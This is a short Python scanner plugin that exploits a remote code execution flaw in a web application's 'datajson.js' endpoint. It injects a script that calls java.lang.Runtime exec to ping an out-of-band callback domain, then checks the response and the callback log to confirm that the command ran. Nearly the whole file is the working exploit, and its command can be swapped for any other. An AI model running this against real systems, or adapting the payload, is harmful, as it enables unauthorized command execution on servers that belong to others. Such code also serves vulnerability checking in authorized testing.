#-*-coding:utf-8-*-
import requests,re,urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import sys,os
cwd=os.getcwd()
sys.path.append(cwd+'\\reverse')
from getdomain import get_domain
from getresult import get_result
def scan(baseurl):
    gets=get_domain()
    domain=gets[0]
    token=gets[1]
    url = baseurl+ 'data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec("ping -c 4 '+domain+'")&type=1'
    header = {"User-Agent":
                  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3861.400 QQBrowser/10.7.4313.400",
              'Connection': 'close'
              }
    req = requests.get(url=url, headers=header, timeout=8, verify=False)
    page_content = req.text
    if "模拟通过" in page_content and get_result(domain,token):
        return True
    else:
        return False

